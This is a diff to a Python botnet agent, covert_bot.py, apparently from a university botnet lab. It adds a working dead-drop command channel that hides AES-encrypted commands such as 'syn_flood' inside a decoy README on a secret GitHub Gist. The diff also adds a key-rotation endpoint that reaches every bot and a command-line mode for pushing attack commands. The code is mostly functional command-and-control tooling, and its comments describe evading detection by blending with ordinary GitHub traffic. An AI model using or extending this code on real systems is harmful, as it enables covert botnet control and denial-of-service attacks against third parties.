@@ -302,17 +302,44 @@ def decode_command(blob: str, secret: bytes = None) -> dict | None:
 
 # ── Dead drop resolvers ───────────────────────────────────────
 
-# In the real lab: botmaster pastes encoded payload into a GitHub Gist.
-# The bot fetches the raw Gist content, finds the sentinel marker,
-# extracts the base64 blob, and decrypts it.
+# ── Dead drop configuration ───────────────────────────────────
 #
-# Lab simulation: bot reads from a local "dead_drop.txt" file on the C2 VM
-# (served over HTTP) to avoid actual GitHub traffic during testing.
-# To use real GitHub: replace DEAD_DROP_URL with a raw Gist URL.
+# TWO MODES:
+#
+#   Lab simulation (default):
+#     DEAD_DROP_URL = "http://192.168.100.10:5001/dead_drop"
+#     The local Flask server on port 5001 serves a fake "README" containing
+#     the encoded command.  No internet access required.
+#
+#   Real GitHub Gist (production threat model):
+#     DEAD_DROP_URL = "https://gist.githubusercontent.com/<user>/<gist_id>/raw"
+#     The bot fetches the raw Gist file over HTTPS.  A bot making HTTPS
+#     requests to raw.githubusercontent.com is indistinguishable from a
+#     developer reading a README.
+#
+#     Botmaster workflow:
+#       1. Create a *secret* Gist on github.com with any filename (e.g. notes.md).
+#       2. Set GIST_ID and GITHUB_TOKEN below (or pass as env vars).
+#       3. Use the CLI: python3 covert_bot.py gist '{"type":"syn_flood",...}'
+#          This encodes the command and pushes it to the Gist automatically.
+#       4. Bots poll DEAD_DROP_URL every ~60 s and execute the command.
+#       5. To idle bots: python3 covert_bot.py gist '{"type":"idle"}'
+#
+#     The Gist content format is identical to the lab server — the bot parser
+#     is the same regardless of which backend serves the file.
 
-DEAD_DROP_URL   = "http://192.168.100.10:5001/dead_drop"   # lab simulation endpoint
+DEAD_DROP_URL   = "http://192.168.100.10:5001/dead_drop"   # lab simulation (default)
+# DEAD_DROP_URL = "https://gist.githubusercontent.com/<USER>/<GIST_ID>/raw"  # real Gist
+
 DEAD_DROP_MARKER_START = "<!-- CMD:"
 DEAD_DROP_MARKER_END   = ":CMD -->"
+
+# GitHub Gist credentials — used only by the 'gist' CLI mode.
+# Override with environment variables GIST_ID and GITHUB_TOKEN so credentials
+# are never committed to the repository.
+import os as _os
+GIST_ID       = _os.environ.get("GIST_ID",       "")   # e.g. "a1b2c3d4e5f6..."
+GITHUB_TOKEN  = _os.environ.get("GITHUB_TOKEN",  "")   # personal access token (gist scope)
 
 # JA3-mimicry: set TLS context to match Chrome 120's cipher suite order.
 # Real JA3 mimicry requires specifying cipher suite order at the SSL context level.
@@ -683,14 +710,121 @@ class CovertBot:
 # In the real Phase 2, the botmaster posts the payload to GitHub.
 # In the lab, this Flask server simulates the GitHub raw file endpoint.
 
+def push_to_gist(cmd: dict, gist_id: str = None, token: str = None) -> bool:
+    """
+    Encode `cmd` and push it to a GitHub Gist via the REST API.
+
+    The Gist file content is a plain-text "README" with the AES-encrypted
+    command embedded in the sentinel markers.  The bot fetches the raw URL
+    and the existing parser extracts and decrypts it unchanged.
+
+    Args:
+        cmd      : command dict, e.g. {"type":"syn_flood","target":"..."}
+        gist_id  : GitHub Gist ID (default: GIST_ID env / module constant)
+        token    : GitHub personal access token with 'gist' scope
+                   (default: GITHUB_TOKEN env / module constant)
+
+    Returns True on success, False on any error.
+
+    Prerequisites:
+        1. Create a *secret* Gist at https://gist.github.com with one file.
+        2. Copy the Gist ID from the URL (the long hex string).
+        3. Generate a PAT at https://github.com/settings/tokens
+           with only the 'gist' scope checked.
+        4. Set GIST_ID and GITHUB_TOKEN environment variables, or pass them
+           as arguments.
+        5. Point bots at the raw URL:
+             DEAD_DROP_URL = "https://gist.githubusercontent.com/<user>/<id>/raw"
+    """
+    gist_id = gist_id or GIST_ID
+    token   = token   or GITHUB_TOKEN
+
+    if not gist_id:
+        print("[GIST] ERROR: GIST_ID not set. "
+              "Export GIST_ID=<your_gist_id> or pass gist_id=.")
+        return False
+    if not token:
+        print("[GIST] ERROR: GITHUB_TOKEN not set. "
+              "Export GITHUB_TOKEN=<pat_with_gist_scope>.")
+        return False
+
+    encoded = encode_command(cmd)
+    content = (
+        f"# Project Notes - Last updated "
+        f"{datetime.utcnow().strftime('%Y-%m-%d')}\n\n"
+        f"This repository contains research notes for CS project.\n\n"
+        f"{DEAD_DROP_MARKER_START}{encoded}{DEAD_DROP_MARKER_END}\n\n"
+        f"## Status\nOngoing.\n"
+    )
+
+    # GitHub Gist PATCH API — updates the first file in the Gist.
+    # We need the filename; fetch it first.
+    try:
+        meta_url = f"https://api.github.com/gists/{gist_id}"
+        meta_req = urllib.request.Request(
+            meta_url,
+            headers={
+                "Authorization": f"token {token}",
+                "Accept":        "application/vnd.github.v3+json",
+                "User-Agent":    "AUA-BotnetLab/1.0",
+            }
+        )
+        with urllib.request.urlopen(meta_req, timeout=10) as resp:
+            meta = json.loads(resp.read().decode())
+        filename = next(iter(meta["files"]))   # first file in the Gist
+    except Exception as e:
+        print(f"[GIST] ERROR fetching Gist metadata: {e}")
+        return False
+
+    patch_body = json.dumps({
+        "files": {filename: {"content": content}}
+    }).encode()
+
+    patch_req = urllib.request.Request(
+        f"https://api.github.com/gists/{gist_id}",
+        data=patch_body,
+        method="PATCH",
+        headers={
+            "Authorization": f"token {token}",
+            "Content-Type":  "application/json",
+            "Accept":        "application/vnd.github.v3+json",
+            "User-Agent":    "AUA-BotnetLab/1.0",
+        }
+    )
+    try:
+        with urllib.request.urlopen(patch_req, timeout=10) as resp:
+            result = json.loads(resp.read().decode())
+        raw_url = result["files"][filename]["raw_url"]
+        print(f"[GIST] Command '{cmd.get('type')}' pushed to Gist.")
+        print(f"[GIST] Raw URL: {raw_url}")
+        print(f"[GIST] Set DEAD_DROP_URL = \"{raw_url.split('?')[0]}\" in bots.")
+        return True
+    except urllib.error.HTTPError as e:
+        body = e.read().decode()
+        print(f"[GIST] HTTP {e.code}: {body[:200]}")
+        return False
+    except Exception as e:
+        print(f"[GIST] ERROR patching Gist: {e}")
+        return False
+
+
 def run_dead_drop_server(host="0.0.0.0", port=5001):
     """
     Minimal dead drop server (run on C2 VM alongside c2_server.py).
+
+    Routes:
+      GET  /dead_drop          — bot polling endpoint (mimics GitHub raw file)
+      POST /set_command        — botmaster sets next command
+      POST /clear_command      — botmaster clears command (bots go idle)
+      POST /push_key           — botmaster rotates AES key and queues
+                                 update_secret for all registered bots
+                                 Body: {"secret": "<new_key>"}
+                                 Requires c2_server.py on port 5000.
+
     Botmaster updates the active command via:
         curl -X POST http://192.168.100.10:5001/set_command \\
              -H "Content-Type: application/json" \\
              -d '{"type":"syn_flood","target":"192.168.100.20","duration":20}'
-    The bot fetches /dead_drop and extracts the embedded AES-encrypted blob.
     """
     try:
         from flask import Flask, request, jsonify
@@ -699,17 +833,14 @@ def run_dead_drop_server(host="0.0.0.0", port=5001):
 
         @dd_app.route("/dead_drop")
         def dead_drop():
-            # Return HTML-like content with embedded command marker
-            # Mimics a GitHub README or Gist file
-            content = f"""# Project Notes - Last updated {datetime.utcnow().strftime('%Y-%m-%d')}
-
-This repository contains research notes for CS project.
-
-<!-- CMD:{_current_payload['encoded']}:CMD -->
-
-## Status
-Ongoing.
-"""
+            content = (
+                f"# Project Notes - Last updated "
+                f"{datetime.utcnow().strftime('%Y-%m-%d')}\n\n"
+                f"This repository contains research notes for CS project.\n\n"
+                f"{DEAD_DROP_MARKER_START}{_current_payload['encoded']}"
+                f"{DEAD_DROP_MARKER_END}\n\n"
+                f"## Status\nOngoing.\n"
+            )
             return content, 200, {"Content-Type": "text/plain"}
 
         @dd_app.route("/set_command", methods=["POST"])
@@ -719,7 +850,7 @@ Ongoing.
                 return jsonify({"error": "no JSON body"}), 400
             encoded = encode_command(cmd)
             _current_payload["encoded"] = encoded
-            print(f"[DEAD_DROP] New command set: {cmd['type']} | blob={encoded[:30]}...")
+            print(f"[DEAD_DROP] Command set: {cmd['type']} | blob={encoded[:30]}...")
             return jsonify({"status": "ok", "encoded_length": len(encoded)})
 
         @dd_app.route("/clear_command", methods=["POST"])
@@ -727,9 +858,82 @@ Ongoing.
             _current_payload["encoded"] = ""
             return jsonify({"status": "cleared"})
 
+        @dd_app.route("/push_key", methods=["POST"])
+        def push_key():
+            """
+            Rotate the shared AES key.
+
+            Steps:
+              1. Accepts {"secret": "<new_key>"} (min 8 chars).
+              2. Encodes an update_secret command with the NEW key,
+                 signed with the CURRENT key so bots can decrypt it.
+              3. Sets it as the active dead-drop payload — bots will
+                 pick it up on their next poll and switch to the new key.
+              4. Optionally forwards the same command to c2_server.py
+                 /task so Phase 1 bots (bot_agent) also receive it.
+
+            After bots have had one full poll cycle (≥60 s) to pick up
+            the rotation, call /set_command with the next real command
+            encoded with the new key, and update SHARED_SECRET in this
+            server process by restarting it with the new key set.
+
+            Note: this endpoint uses the CURRENT SHARED_SECRET to encode
+            the command, so it must be called before any manual restart
+            of the dead-drop server changes the key.
+            """
+            data = request.get_json(silent=True) or {}
+            new_secret = data.get("secret", "")
+            if not new_secret or len(new_secret) < 8:
+                return jsonify({
+                    "error": "secret must be at least 8 characters"
+                }), 400
+
+            rotation_cmd = {"type": "update_secret", "secret": new_secret}
+            encoded = encode_command(rotation_cmd)   # signed with CURRENT key
+            _current_payload["encoded"] = encoded
+            print(f"[DEAD_DROP] Key rotation queued — "
+                  f"new secret: {new_secret[:4]}... "
+                  f"(bots will pick up on next poll)")
+
+            # Also forward to Phase 1 C2 so bot_agent.c bots get it
+            forwarded = False
+            try:
+                c2_url  = "http://127.0.0.1:5000/task"
+                c2_body = json.dumps({
+                    "bot_id":  "all",
+                    "type":    "update_secret",
+                    "secret":  new_secret,
+                    "duration": 10,
+                }).encode()
+                c2_req = urllib.request.Request(
+                    c2_url, data=c2_body,
+                    headers={
+                        "Content-Type":  "application/json",
+                        "X-Auth-Token":  "LAB_RESEARCH_TOKEN_2026",
+                    }
+                )
+                with urllib.request.urlopen(c2_req, timeout=3):
+                    pass
+                forwarded = True
+                print("[DEAD_DROP] Key rotation also forwarded to c2_server /task")
+            except Exception:
+                pass   # c2_server may not be running during Phase 2 only runs
+
+            return jsonify({
+                "status":              "rotation_queued",
+                "forwarded_to_c2":     forwarded,
+                "note": (
+                    "Bots will receive new key on next dead-drop poll (~60 s). "
+                    "After one full poll cycle, restart this server with "
+                    "SHARED_SECRET set to the new value."
+                )
+            })
+
         print(f"[DEAD_DROP] Server running on {host}:{port}")
-        print(f"[DEAD_DROP] Set command: POST /set_command {{\"type\":\"syn_flood\",...}}")
-        print(f"[DEAD_DROP] Bots poll: GET /dead_drop")
+        print(f"[DEAD_DROP] Set command:   POST /set_command {{\"type\":\"syn_flood\",...}}")
+        print(f"[DEAD_DROP] Clear command: POST /clear_command")
+        print(f"[DEAD_DROP] Rotate key:    POST /push_key {{\"secret\":\"NEW_KEY\"}}")
+        print(f"[DEAD_DROP] Bots poll:     GET  /dead_drop")
         dd_app.run(host=host, port=port, debug=False)
 
     except ImportError:
@@ -759,6 +963,52 @@ if __name__ == "__main__":
         blob = sys.argv[2] if len(sys.argv) > 2 else input("Paste blob: ").strip()
         cmd = decode_command(blob)
         print(f"Decoded: {cmd}")
+
+    elif len(sys.argv) > 1 and sys.argv[1] == "gist":
+        # Push a command directly to a GitHub Gist (real dead drop)
+        #
+        # Usage:
+        #   export GIST_ID=<your_gist_id>
+        #   export GITHUB_TOKEN=<pat_with_gist_scope>
+        #   python3 covert_bot.py gist '{"type":"syn_flood","target":"192.168.100.20","duration":20}'
+        #   python3 covert_bot.py gist '{"type":"idle"}'   # silence bots
+        #
+        # The Gist must already exist (create it manually at gist.github.com).
+        # The PAT needs only the 'gist' scope.
+        #
+        # After pushing, bots polling the raw Gist URL will execute the command
+        # on their next poll cycle (~60 s).  Point bots at the raw URL:
+        #   DEAD_DROP_URL = "https://gist.githubusercontent.com/<user>/<id>/raw"
+        if len(sys.argv) < 3:
+            print("Usage: python3 covert_bot.py gist '{\"type\":\"syn_flood\",...}'")
+            print("\nRequired environment variables:")
+            print("  GIST_ID      — the hex ID from https://gist.github.com/...")
+            print("  GITHUB_TOKEN — PAT with 'gist' scope only")
+            sys.exit(1)
+        cmd = json.loads(sys.argv[2])
+        ok = push_to_gist(cmd)
+        sys.exit(0 if ok else 1)
+
+    elif len(sys.argv) > 1 and sys.argv[1] == "rotate":
+        # Rotate AES key via the lab dead-drop server's /push_key endpoint.
+        # Usage: python3 covert_bot.py rotate <new_secret>
+        if len(sys.argv) < 3:
+            print("Usage: python3 covert_bot.py rotate <new_secret>")
+            sys.exit(1)
+        new_secret = sys.argv[2]
+        dd_url = "http://192.168.100.10:5001/push_key"
+        body   = json.dumps({"secret": new_secret}).encode()
+        req    = urllib.request.Request(
+            dd_url, data=body,
+            headers={"Content-Type": "application/json"}
+        )
+        try:
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                result = json.loads(resp.read().decode())
+            print(json.dumps(result, indent=2))
+        except Exception as e:
+            print(f"ERROR: {e}")
+            sys.exit(1)
 
     else:
         # Run as bot agent (on bot VMs)
